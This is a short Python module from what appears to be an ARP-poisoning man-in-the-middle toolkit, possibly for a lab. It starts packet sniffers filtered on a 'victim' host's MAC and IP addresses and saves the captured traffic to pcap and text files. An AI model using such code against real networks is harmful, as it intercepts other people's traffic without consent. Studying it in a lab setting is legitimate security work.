from HMKamene.sniff import Sniffer
from HMGeneric.internetProtocol import ArpObj


def start_sniff_thread(globalVars, gatewayArp: ArpObj, victimArp: ArpObj):
    sniffer = Sniffer()
    sniffer.store = 0
    sniffer.filter = 'ether src ' + victimArp.MACAddress + ' or dst host ' + victimArp.IPAddress
    sniffer.stopCallbackVar = globalVars.get_stop_arp_posion
    sniffer.sniffObj.start()
    sniffer.sniffObj.join()
    sniffer.savePCAP("sniff_thread.pcap")

def start_lab_thread(globalVars, gatewayArp: ArpObj, victimArp: ArpObj):
    sniffer = Sniffer()
    sniffer.store = 0
    sniffer.filter = 'dst host ' + victimArp.IPAddress + ' or src host ' + victimArp.IPAddress
    sniffer.stopCallbackVar = globalVars.get_stop_arp_posion
    sniffer.sniffObj.start()
    sniffer.sniffObj.join()
    sniffer.savePCAP("sniff_lab_thread.pcap")
    sniffer.saveTXT("sniff_lab_thread.txt")